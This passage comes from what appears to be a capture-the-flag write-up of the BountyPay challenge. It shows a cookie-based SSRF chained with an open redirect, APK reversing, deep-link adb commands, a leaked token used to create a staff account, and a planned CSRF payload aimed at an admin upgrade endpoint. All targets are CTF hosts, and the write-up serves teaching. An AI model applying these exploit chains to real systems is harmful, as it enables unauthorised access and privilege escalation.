<pre><code>eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n</code></pre> <p>The beggining of the string <code>eyJ</code> is characteristic of base64 JSON encoded data. Let's see what's inside:</p> <pre><code>{\n  \"account_id\": \"F8gHiqSdpK\",\n  \"hash\": \"de235bffd23df6995ad4e0930baac1a2\"\n}\n</code></pre> <p>We can see that our session cookie contains the <code>account_id</code> which is present in the URL used to retrieve the transactions. If our assumptions is correct this means that we can manipulate the URL used to retrieve the transactions. Without another <code>account_id</code> we can't test for IDOR but we might be able to manipulate the request.</p> <p>If we set the value of the token cookie to <code>../accounts/F8gHiqSdpK</code> ,we can see that the reponse is identical which means that we currently have an SSRF that is limited to the app.bountypay.h1ctf.com subdomain.</p> <p>One way to augment the impact of an SSRF is to use an open redirect to be able to target non whitelisted domains or in our case a domain that is not app.bountypay.h1ctf.com. If we look back at the notes taken during the passive reconnaissance phase, there is one feature that might be useful.</p> <p>On api.bountypay.h1ctf.com there is a link to Google Search that is not a simple link. Let's look at the request:</p> <pre><code>http get \"https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\"\n</code></pre> <pre><code>HTTP/1.1 302 Found\nConnection: keep-alive\nContent-Type: text/html; charset=UTF-8\nDate: Thu, 04 Jun 2020 16:57:33 GMT\nLocation: https://www.google.com/search?q=REST API\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n</code></pre> <p>The problem is that there is an allowlist which appear to only accept a URL that starts with <code>https://www.google.com/search?q=</code>. Otherwise we get an error, either <code>URL NOT FOUND IN WHITELIST</code> or <code>URL must begin with either http:// or https://</code>.</p> <p>My initial idea was that if we can bypass the allowlist we could send the request to a server under our control which would allow us to intercept some potentially interesting headers or cookies. After multiple failed attemps it appeared that it was not possible to bypass the allowlist.</p> <p>If we cannot bypass the controls in place, maybe we can find other urls present in the allowlist. It turns out that both <code>https://staff.bountypay.h1ctf.com/</code> and <code>https://software.bountypay.h1ctf.com/</code> are accepted ! Which means that we can bypass the IP restriction on software.bountypay.h1ctf.com.</p> <p>Warning</p> <p>I ended spending way more time on this step since when I first tested this I did not add the <code>/</code> at the end of the URL resulting in a URL <code>NOT FOUND IN WHITELIST</code> error \ud83d\ude22. The cool part is that because of that I went down a rabbit hole thinking that there might an open redirect on www.google.com. Turns out there are some but they were not exploitable since the whitelisted URL needed to end with <code>search?q=.</code></p> <p>Let's set <code>../../redirect?url=https://software.bountypay.h1ctf.com/#</code> as our account id and see what happens:</p> <pre><code>{\n  \"account_id\": \"../../redirect?url=https://software.bountypay.h1ctf.com/\",\n  \"hash\": \"de235bffd23df6995ad4e0930baac1a2\"\n}\n</code></pre> <pre><code>http get https://app.bountypay.h1ctf.com/statements\\?month\\=02\\&amp;year\\=2020 \\\nCookie:'token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0='\n</code></pre> <pre><code>HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Type: application/json\nDate: Thu, 04 Jun 2020 17:10:40 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n{\n    \"data\": \"&lt;!DOCTYPE html&gt;\\n&lt;html lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n    &lt;meta charset=\\\"utf-8\\\"&gt;\\n    &lt;meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"&gt;\\n    &lt;meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\"&gt;\\n    &lt;title&gt;Software Storage&lt;/title&gt;\\n    &lt;link href=\\\"/css/bootstrap.min.css\\\" rel=\\\"stylesheet\\\"&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n\\n&lt;div class=\\\"container\\\"&gt;\\n    &lt;div class=\\\"row\\\"&gt;\\n        &lt;div class=\\\"col-sm-6 col-sm-offset-3\\\"&gt;\\n            &lt;h1 style=\\\"text-align: center\\\"&gt;Software Storage&lt;/h1&gt;\\n            &lt;form method=\\\"post\\\" action=\\\"/\\\"&gt;\\n                &lt;div class=\\\"panel panel-default\\\" style=\\\"margin-top:50px\\\"&gt;\\n                    &lt;div class=\\\"panel-heading\\\"&gt;Login&lt;/div&gt;\\n                    &lt;div class=\\\"panel-body\\\"&gt;\\n                        &lt;div style=\\\"margin-top:7px\\\"&gt;&lt;label&gt;Username:&lt;/label&gt;&lt;/div&gt;\\n                        &lt;div&gt;&lt;input name=\\\"username\\\" class=\\\"form-control\\\"&gt;&lt;/div&gt;\\n                        &lt;div style=\\\"margin-top:7px\\\"&gt;&lt;label&gt;Password:&lt;/label&gt;&lt;/div&gt;\\n                        &lt;div&gt;&lt;input name=\\\"password\\\" type=\\\"password\\\" class=\\\"form-control\\\"&gt;&lt;/div&gt;\\n                    &lt;/div&gt;\\n                &lt;/div&gt;\\n                &lt;input type=\\\"submit\\\" class=\\\"btn btn-success pull-right\\\" value=\\\"Login\\\"&gt;\\n            &lt;/form&gt;\\n        &lt;/div&gt;\\n    &lt;/div&gt;\\n&lt;/div&gt;\\n&lt;script src=\\\"/js/jquery.min.js\\\"&gt;&lt;/script&gt;\\n&lt;script src=\\\"/js/bootstrap.min.js\\\"&gt;&lt;/script&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\",\n    \"url\": \"https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/#/statements?month=02&amp;year=2020\"\n}\n</code></pre> <p>The data now contains the HTML content of the software.bountypay.h1ctf index page which is a login form:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n    &lt;title&gt;Software Storage&lt;/title&gt;\n    &lt;link href=\"/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n    &lt;div class=\"container\"&gt;\n    &lt;div class=\"row\"&gt;\n        &lt;div class=\"col-sm-6 col-sm-offset-3\"&gt;\n            &lt;h1 style=\"text-align: center\"&gt;Software Storage&lt;/h1&gt;\n            &lt;form method=\"post\" action=\"/\"&gt;\n                &lt;div class=\"panel panel-default\" style=\"margin-top:50px\"&gt;\n                    &lt;div class=\"panel-heading\"&gt;Login&lt;/div&gt;\n                    &lt;div class=\"panel-body\"&gt;\n                        &lt;div style=\"margin-top:7px\"&gt;&lt;label&gt;Username:&lt;/label&gt;&lt;/div&gt;\n                        &lt;div&gt;&lt;input name=\"username\" class=\"form-control\"&gt;&lt;/div&gt;\n                        &lt;div style=\"margin-top:7px\"&gt;&lt;label&gt;Password:&lt;/label&gt;&lt;/div&gt;\n                        &lt;div&gt;&lt;input name=\"password\" type=\"password\" class=\"form-control\"&gt;&lt;/div&gt;\n                    &lt;/div&gt;\n                &lt;/div&gt;\n                &lt;input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"&gt;\n            &lt;/form&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;script src=\"/js/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"/js/bootstrap.min.js\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Since our SSRF is pretty limited (we can only do GET requests), the next logical step is to do more enumerations. For this we can use Burp Intruder with Hackvertor to dynamically base64 encode the payload.</p> <p></p> <p>The \"Directories - short\" gives us some interesting results:</p> <p></p> <p>It appears that there is an apk in the sources directory. The apk can be retrieved as there are no access control !</p> <pre><code>http get https://software.bountypay.h1ctf.com/uploads/BountyPay.apk\n</code></pre> <pre><code>HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Type: application/octet-stream\nDate: Thu, 04 Jun 2020 17:12:44 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n\n\n+-----------------------------------------+\n| NOTE: binary data not shown in terminal |\n+-----------------------------------------+\n</code></pre>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#android-reverse-engineering","title":"Android Reverse Engineering","text":"<p>Let's start by decompiling the APK using JADX which is a Dex to Java decompiler:</p> <pre><code>jadx BountyPay.apk\n</code></pre> <p>In our case the interesting files are going to be in <code>/sources/bounty</code>:</p> <pre><code>/BountyPay/sources/bounty\n\u2514\u2500\u2500 pay\n    \u251c\u2500\u2500 BuildConfig.java\n    \u251c\u2500\u2500 CongratsActivity.java\n    \u251c\u2500\u2500 MainActivity.java\n    \u251c\u2500\u2500 PartOneActivity.java\n    \u251c\u2500\u2500 PartThreeActivity.java\n    \u251c\u2500\u2500 PartTwoActivity.java\n    \u2514\u2500\u2500 R.java\n\n1 directory, 7 files\n</code></pre> <p>We can see that there is one MainActivity and three activities named PartOne, PartTwo and PartThree.</p> <p>Looking at the Manifest we can see that there are actually 5 activities define:</p> <ul> <li>bounty.pay.MainActivity</li> <li>bounty.pay.PartOneActivity</li> <li>bounty.pay.PartTwoActivity</li> <li>bounty.pay.PartThreeActivity</li> <li>bounty.pay.CongratsActivity</li> </ul> AndroidManifest.xml<pre><code>&lt;activity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_congrats\" android:name=\"bounty.pay.CongratsActivity\"/&gt;\n&lt;activity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_three\" android:name=\"bounty.pay.PartThreeActivity\"&gt;\n    &lt;intent-filter android:label=\"\"&gt;\n        &lt;action android:name=\"android.intent.action.VIEW\"/&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;\n        &lt;category android:name=\"android.intent.category.BROWSABLE\"/&gt;\n        &lt;data android:scheme=\"three\" android:host=\"part\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n&lt;activity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_two\" android:name=\"bounty.pay.PartTwoActivity\"&gt;\n    &lt;intent-filter android:label=\"\"&gt;\n        &lt;action android:name=\"android.intent.action.VIEW\"/&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;\n        &lt;category android:name=\"android.intent.category.BROWSABLE\"/&gt;\n        &lt;data android:scheme=\"two\" android:host=\"part\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n&lt;activity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\"&gt;\n    &lt;intent-filter android:label=\"\"&gt;\n        &lt;action android:name=\"android.intent.action.VIEW\"/&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;\n        &lt;category android:name=\"android.intent.category.BROWSABLE\"/&gt;\n        &lt;data android:scheme=\"one\" android:host=\"part\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n&lt;activity android:name=\"bounty.pay.MainActivity\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n        &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <p>Something interesting to note is that PartOne, PartTwo and PartThree activities all defined an intent filter a scheme and an host:</p> <ul> <li>one://part</li> <li>two://part</li> <li>three://part</li> </ul> <p>Let's install the app on our favorite emulator (here I'm using Android Studio's emulator) using adb:</p> <pre><code>adb install BountyPay.apk\n</code></pre> <p>The fist screen invites us to enter a username and a Twitter handle.</p> <p></p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#partoneactivity","title":"PartOneActivity","text":"<p>The PartOne acitivity only has a button that gives use hints when we click on it:</p> <ul> <li>Deep links.</li> <li>Params.</li> </ul> <p>Info</p> <p>Deeplinks are a concept that help users navigate between the web and applications. They are basically URLs which navigate users directly to the specific content in applications. Optionally, some data or parameter can be passed along.</p> <p>When we look at the code we can see the corresponding code:</p> <pre><code>public void onClick(View view) {\n  if (PartOneActivity.this.click == 0) {\n    Snackbar.make(view, (CharSequence) \"Deep links.\", 0)\n    .setAction((CharSequence) \"Action\", (View.OnClickListener) null)\n    .show();\n    PartOneActivity.this.click++;\n  } else if (PartOneActivity.this.click == 1) {\n    Snackbar.make(view, (CharSequence) \"Params.\", 0)\n    .setAction((CharSequence) \"Action\", (View.OnClickListener) null)\n    .show();\n    PartOneActivity.this.click = 0;\n  }\n}\n</code></pre> <p>Afterwards we can see that there are a few conditions to continue to the next activity:</p> <ul> <li>The setting should contains a username (set on the first screen)</li> <li>A query parameter named <code>start</code> should be present with a value of <code>PartTwoActivity</code></li> </ul> <p>If all the condiditions are met the PartTwo activity is started.</p> <pre><code>if (!settings.contains(\"USERNAME\")) {\n  Toast.makeText(getApplicationContext(), \"Please create a CTF username :)\", 0)\n  .show();\n  startActivity(new Intent(this, MainActivity.class));\n}\nif (getIntent() != null &amp;&amp; getIntent().getData() != null \n    &amp;&amp; (firstParam = getIntent().getData().getQueryParameter(\"start\")) != null \n    &amp;&amp; firstParam.equals(\"PartTwoActivity\") \n    &amp;&amp; settings.contains(\"USERNAME\")) {\n\n  String user = settings.getString(\"USERNAME\", \"\");\n  SharedPreferences.Editor editor = settings.edit();\n  String twitterhandle = settings.getString(\"TWITTERHANDLE\", \"\");\n  editor.putString(\"PARTONE\", \"COMPLETE\").apply();\n  logFlagFound(user, twitterhandle);\n  startActivity(new Intent(this, PartTwoActivity.class));\n}\n</code></pre> <p>This can be done using adb using the following command:</p> <pre><code>adb shell am start -W -a android.intent.action.VIEW \\\n-d \"one://part?start=PartTwoActivity\" bounty.pay\nStarting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }\nStatus: ok\nActivity: bounty.pay/.PartOneActivity\nThisTime: 470\nTotalTime: 470\nWaitTime: 499\nComplete\n</code></pre>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#parttwoactivity","title":"PartTwoActivity","text":"<p>Here again we are presented with a white screen with a button giving us two hints:</p> <ul> <li>Currently invisible.</li> <li>Visible with the right params.</li> </ul> <p></p> <p>This seems to imply that there is some invisible content that will be revealed if we send the right parameters. Let's look at the code.</p> PartTwoActivity.java<pre><code>public void onCreate(Bundle savedInstanceState) {\n  [...]\n  editText.setVisibility(4);\n  button.setVisibility(4);\n  textview.setVisibility(4);\n  [...]\n  if (!settings.contains(\"USERNAME\")) {\n    Toast.makeText(\n      getApplicationContext(), \"Please create a CTF username :)\",\n      0\n    )\n    .show();\n    startActivity(new Intent(this, MainActivity.class));\n  }\n  if (!settings.contains(\"PARTONE\")) {\n    Toast.makeText(\n      getApplicationContext(),\n      \"Part one not completed!\",\n      0\n    )\n    .show();\n    startActivity(new Intent(this, MainActivity.class));\n  }\n  if (getIntent() != null &amp;&amp; getIntent().getData() != null) {\n    Uri data = getIntent().getData();\n    String firstParam = data.getQueryParameter(\"two\");\n    String secondParam = data.getQueryParameter(\"switch\");\n    if (firstParam != null &amp;&amp;\n      firstParam.equals(\"light\") &amp;&amp;\n      secondParam != null &amp;&amp;\n      secondParam.equals(\"on\")) {\n      editText.setVisibility(0);\n      button.setVisibility(0);\n      textview.setVisibility(0);\n    }\n  }\n}\n</code></pre> <p>This time we can see that some conditions are required to be able to see the invisible content:</p> <ul> <li>The username needs to be set</li> <li>Part one needs to be complete</li> <li>Two parameter are required, <code>two</code> with a value of <code>light</code> and <code>switch</code> with a value of <code>on</code></li> </ul> <p>Here again we can do this using adb:</p> <pre><code>adb shell am start -W -a android.intent.action.VIEW \\\n-d \"two://part?two=light\\&amp;switch=on\" bounty.pay\nStarting: Intent { act=android.intent.action.VIEW dat=two://part?two=light&amp;switch=on pkg=bounty.pay }\nStatus: ok\nActivity: bounty.pay/.PartTwoActivity\nThisTime: 238\nTotalTime: 238\nWaitTime: 275\nComplete\n</code></pre> <p>Warning</p> <p>Make sure to escape the <code>&amp;</code> when passing multiple parameters !</p> <p>As expected we can now see an input field expecting a <code>Header value</code> and underneath an MD5 hash.</p> <p></p> <p>Clicking on the submit button will trigger the <code>submitInfo</code> function. We can see that the header value should start with <code>X-</code> and if so the <code>correctHeader</code> function will be called which in turns will start PartThreeActivity.</p> <pre><code>public void submitInfo(View view) {\n  final String post = ((EditText) findViewById(R.id.editText)).getText().toString();\n  this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {\n    public void onDataChange(DataSnapshot dataSnapshot) {\n      SharedPreferences settings = PartTwoActivity.this.getSharedPreferences(\n        PartTwoActivity.KEY_USERNAME,\n        0\n      );\n      SharedPreferences.Editor editor = settings.edit();\n      String str = post;\n      if (str.equals(\"X-\" + ((String) dataSnapshot.getValue()))) {\n        PartTwoActivity.this.logFlagFound(\n          settings.getString(\"USERNAME\", \"\"),\n          settings.getString(\"TWITTERHANDLE\", \"\")\n        );\n        editor.putString(\"PARTTWO\", \"COMPLETE\").apply();\n        PartTwoActivity.this.correctHeader();\n        return;\n      }\n      Toast.makeText(PartTwoActivity.this, \"Try again! :D\", 0).show();\n    }\n\n    public void onCancelled(DatabaseError databaseError) {\n      Log.e(PartTwoActivity.TAG, \"onCancelled\", databaseError.toException());\n    }\n  });\n}\n\n/* access modifiers changed from: private */\npublic void correctHeader() {\n  startActivity(new Intent(this, PartThreeActivity.class));\n}\n</code></pre>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#partthreeactivity","title":"PartThreeActivity","text":"<p>This time the conditions that needs to be met are:</p> <ul> <li>First param three should be equal to <code>Base64(\"PartThreeActivity\")</code></li> <li>Second param switch should be equal to <code>Base64(\"on\")</code></li> <li>Third param header should be equal to the previously defined header, in our case <code>X-Token</code></li> </ul> <pre><code>if (getIntent() != null &amp;&amp; getIntent().getData() != null) {\n  Uri data = getIntent().getData();\n  String firstParam = data.getQueryParameter(\"three\");\n  String secondParam = data.getQueryParameter(\"switch\");\n  String thirdParam = data.getQueryParameter(\"header\");\n  byte[] decodeFirstParam = Base64.decode(firstParam, 0);\n  byte[] decodeSecondParam = Base64.decode(secondParam, 0);\n  final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);\n  final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);\n  AnonymousClass5 r17 = r0;\n  DatabaseReference databaseReference = this.childRefThree;\n  byte[] bArr = decodeSecondParam;\n  final String str = firstParam;\n  byte[] bArr2 = decodeFirstParam;\n  final String str2 = secondParam;\n  String str3 = secondParam;\n  final String secondParam2 = thirdParam;\n  String str4 = firstParam;\n  final EditText editText2 = editText;\n  Uri uri = data;\n  final Button button2 = button;\n  AnonymousClass5 r0 = new ValueEventListener() {\n    public void onDataChange(DataSnapshot dataSnapshot) {\n      String str;\n      String value = (String) dataSnapshot.getValue();\n      if (str != null &amp;&amp; decodedFirstParam.equals(\"PartThreeActivity\") &amp;&amp;\n        str2 != null &amp;&amp; decodedSecondParam.equals(\"on\") &amp;&amp;\n        (str = secondParam2) != null) {\n        if (str.equals(\"X-\" + value)) {\n          editText2.setVisibility(0);\n          button2.setVisibility(0);\n          PartThreeActivity.this.thread.start();\n        }\n      }\n    }\n\n    public void onCancelled(DatabaseError databaseError) {\n      Log.e(\"TAG\", \"onCancelled\", databaseError.toException());\n    }\n  };\n  databaseReference.addListenerForSingleValueEvent(r0);\n}\n</code></pre> <p>Now that we know all the requirement we can send the intent.</p> <pre><code>adb shell am start -W -a android.intent.action.VIEW \\\n-d \"three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\&amp;switch=b24\\=\\&amp;header=X-Token\" bounty.pay\n</code></pre> <p>We are then asked to provide a \"leaked hash\".</p> <p></p> <p>Looking into the logs using <code>abd logcat</code> we can quickly see our leaked hash:</p> <pre><code>adb logcat | grep IS:\n05-31 20:32:30.618  5199  6360 D HOST IS: : http://api.bountypay.h1ctf.com\n05-31 20:32:30.618  5199  6360 D TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1\n</code></pre> <p>When submitted we get the Congrats activity \ud83e\udd73</p> <p></p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#know-your-staff","title":"Know your staff","text":"","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#getting-an-account-on-staffbountypay","title":"Getting an account on staff.bountypay","text":"<p>We ommitted some things when doing the reconnaiscance, to make the report more readable, that we now need since we don't know what to do with the token that we got from reversing the APK.</p> <p>The most interesting thing is that there is a staff endpoint on the api which throws an error saying <code>Missing or invalid Token</code>:</p> <pre><code>http get https://api.bountypay.h1ctf.com/api/staff\n</code></pre> <pre><code>HTTP/1.1 401 Unauthorized\nConnection: keep-alive\nContent-Type: application/json\nDate: Thu, 04 Jun 2020 19:50:18 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[\n    \"Missing or invalid Token\"\n]\n</code></pre> <p>Let's see what happens when we send the token that we got from reversing the apk:</p> <pre><code>http get https://api.bountypay.h1ctf.com/api/staff \\\nX-Token:8e9998ee3137ca9ade8f372739f062c1\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Type: application/json\nDate: Wed, 03 Jun 2020 20:37:41 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[\n    {\n        \"name\": \"Sam Jenkins\",\n        \"staff_id\": \"STF:84DJKEIP38\"\n    },\n    {\n        \"name\": \"Brian Oliver\",\n        \"staff_id\": \"STF:KE624RQ2T9\"\n    }\n]\n</code></pre> <p>The endpoint now returns two accounts. Something I did not notice at first is that the same endpoint also answers to POST requests. This can be explained since in part II, I limited my recon to enumerating directories and files using GET requests. Something to keep in mind when working with APIs, always test the different HTTP methods \ud83d\ude09</p> <pre><code>http post https://api.bountypay.h1ctf.com/api/staff \\\nX-Token:8e9998ee3137ca9ade8f372739f062c1\n</code></pre> <pre><code>HTTP/1.1 400 Bad Request\nConnection: keep-alive\nContent-Type: application/json\nDate: Wed, 03 Jun 2020 21:21:15 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[\n    \"Missing Parameter\"\n]\n</code></pre> <p>With the POST method we get a different error message \"Missing Parameter\". The logical thing to do is to try the parameters that we saw in the GET request (<code>name</code> and <code>staff_id</code>). When we send the parameter <code>staff_id</code> with a dummy value we get an error message \"Invalid Staff ID\".</p> <pre><code>http -f post https://api.bountypay.h1ctf.com/api/staff \\\nX-Token:8e9998ee3137ca9ade8f372739f062c1 \\\nstaff_id=a\n</code></pre> <pre><code>HTTP/1.1 404 Not Found\nConnection: keep-alive\nContent-Type: application/json\nDate: Wed, 03 Jun 2020 21:22:44 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[\n    \"Invalid Staff ID\"\n]\n</code></pre> <p>If we try set to value of <code>staff_id</code> to the value associated with Sam Jenkins or Brian Oliver we get an error saying \"Staff Member has an account\", which makes sense since this endpoint is probably used to create a new staff account.</p> <pre><code>http -f post https://api.bountypay.h1ctf.com/api/staff \\\nX-Token:8e9998ee3137ca9ade8f372739f062c1 \\\nstaff_id=STF:KE624RQ2T9\n</code></pre> <pre><code>HTTP/1.1 409 Conflict\nConnection: keep-alive\nContent-Type: application/json\nDate: Wed, 03 Jun 2020 21:25:07 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[\n    \"Staff Member already has an account\"\n]\n</code></pre> <p>Now you might remember that in in the reconnaissance phase we found the <code>staff_id</code> of a new employee named Sandra. Let's see what happens when we send this <code>staff_id:</code></p> <pre><code>http -f post https://api.bountypay.h1ctf.com/api/staff \\\nX-Token:8e9998ee3137ca9ade8f372739f062c1 \\\nstaff_id=STF:8FJ3KFISL3\n</code></pre> <pre><code>HTTP/1.1 201 Created\nConnection: keep-alive\nContent-Type: application/json\nDate: Wed, 03 Jun 2020 21:28:01 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n{\n    \"description\": \"Staff Member Account Created\",\n    \"password\": \"s%3D8qB8zEpMnc*xsz7Yp5\",\n    \"username\": \"sandra.allison\"\n}\n</code></pre> <p>Nice we now have an account for the Staff application !</p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#getting-marten-mickos-account","title":"Getting M\u00e5rten Mickos account","text":"<p>Once we are logged in we can see 4 differents tabs:</p> <ul> <li>Home</li> <li>Support Tickets</li> <li>Profile</li> <li>Logout</li> </ul> <p></p> <p>There is only 1 ticket named \"Welcome to BountyPay\" from Admin to Sandra:</p> <p></p> <p>There are not action possible on this screen since it appears that replies are currently disabled. Looking at the source code of the page, there is no reference to any endpoint that we could use to send a reply.</p> <p></p> <p>On the profile page there are two settings that we can update, the profile name and the avatar.</p> <p></p> <p>There is also a feature that is a bit hidden in the footer that allow us to report a page to the admins with a comment saying that the admin directory will be ignored.</p> <p></p> <p>The last interesting thing is a bit of JavaScript:</p> /js/website.js<pre><code>$(\".upgradeToAdmin\").click(function() {\n  let t = $('input[name=\"username\"]').val();\n  $.get(\"/admin/upgrade?username=\" + t, function() {\n    alert(\"User Upgraded to Admin\")\n  })\n});\n\n$(\".tab\").click(function() {\n  return $(\".tab\").removeClass(\"active\"), \n  $(this).addClass(\"active\"), \n  $(\"div.content\").addClass(\"hidden\"), \n  $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}); \n\n$(\".sendReport\").click(function() {\n  $.get(\"/admin/report?url=\" + url, function() {\n    alert(\"Report sent to admin team\")\n  }), $(\"#myModal\").modal(\"hide\")\n});\n\ndocument.location.hash.length &gt; 0 &amp;&amp;\n(\"#tab1\" === document.location.hash &amp;&amp;\n  $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash &amp;&amp;\n  $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash &amp;&amp;\n  $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash &amp;&amp;\n  $(\".tab4\").trigger(\"click\")\n);\n</code></pre> <p>In this JavaScript file we can see multiple things:</p> <ul> <li>There is an <code>/admin/upgrade</code> endpoint which will use the value of an input with the name username as the username</li> <li>Clicking on an element with the <code>sendReport</code> class will trigger a GET request to the <code>/admin/report?url=</code></li> <li>Based on the hash present in the URL, a click will be simulated to go directly to the right tab</li> </ul> <p>Let's start investigating the upgrade endpoint since this our goal is probably to get an admin account. Of course simply requesting the endpoint would be too easy and we get an error if we try to do so :(</p> <pre><code>http get https://staff.bountypay.h1ctf.com/admin/upgrade\n</code></pre> <pre><code>HTTP/1.1 401 Unauthorized\nConnection: keep-alive\nContent-Type: application/json\nDate: Fri, 05 Jun 2020 17:24:01 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[\n    \"Only admins can perform this\"\n]\n</code></pre> <p>At this point it appears that we will need to find a way to trick an admin users into upgrading our account. Let's see if we can find a way to perform a Cross-Site Request Forgery (CSRF) attack. Since the method used to upgrade the account is GET (don't do that) we don't need a Cross-Site Scripting (XSS) and being able to inject an image would be sufficient:</p> <pre><code>&lt;img src=\"/admin/upgrade?username=sandra.allison\" /&gt;\n</code></pre> <p>The profile page appears to be our best candidate to find such a vulnerability since:</p> <ul> <li>We cannot use the report feature here as the <code>/admin</code> directory is ignored</li> <li>The ticket page does not provide us with a way to send a reply</li> </ul> <p>Let's look at the request used to update our profile name:</p> <pre><code>http -f post \"https://staff.bountypay.h1ctf.com/?template=home\" \\\nCookie:'token=c0...' \\\nprofile_name=%3Cs%3Esandra%3C%2Fs%3E\n</code></pre> <p>Here I'm trying to inject the followin payload: <code>&lt;s&gt;sandra&lt;/s&gt;</code> but we can see that all special characters are filtered both on the profile page and on the tickets page.</p> <p></p> <p>The request to change our avatar is working in a similar fashion. There are only three avatars available and when you switch the value <code>avartar1</code>, <code>avatar2</code> or <code>avatar3</code> is sent.</p> <pre><code>http -f post \"https://staff.bountypay.h1ctf.com/?template=home\" \\\nCookie:'token=c0...' \\\nprofile_name=ssandras \\\nprofile_avatar=avatar3\n</code></pre> <p>The value is then used to set a different background image for the div using CSS:</p> <pre><code>&lt;div class=\"col-md-12 text-center\"&gt;\n  &lt;div style=\"margin:auto\" class=\"avatar avatar3\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <pre><code>.avatar1 {\n    background-image:url(\"data:image/png;base64,iVB...=\");\n}\n\n.avatar2 {\n    background-image:url(\"data:image/png;base64,iVB...=\");\n}\n\n.avatar3 {\n    background-image:url(\"data:image/png;base64,iVB...=\");\n}\n</code></pre> <p>Something interesting is that even though, like for our profile name special characters are stripped, we can still use this to set an arbitrary class (or multiple, the space character is allowed) on the div.</p> <p>At first, it looks like that we might be able to set our avatar to <code>upgradeToAdmin</code> and if we can trick an admin into clicking our avatar then we will be admin but there are a couple of issues:</p> <ul> <li>We need to find a page where our avatar will be displayed (this cannot be the profile page since this will not be our avatar that is displayed)</li> <li>We should get rid of the click requirements (since this is a CTF we cannot expect that a human will manually click on our avatar)</li> <li>We need in input in the page with <code>username</code> as its name</li> </ul> <p>The first requirement is easy, the ticket page <code>?template=ticket&amp;ticket_id=3582</code> will display our avatar to anyone who clicks on it. The second one is doable since we can set the <code>tab3</code> class on the avatar as well as set it as a hash in the link we will send to the admin using the report url.</p> <p>So far our avatar is set to  <code>tab3 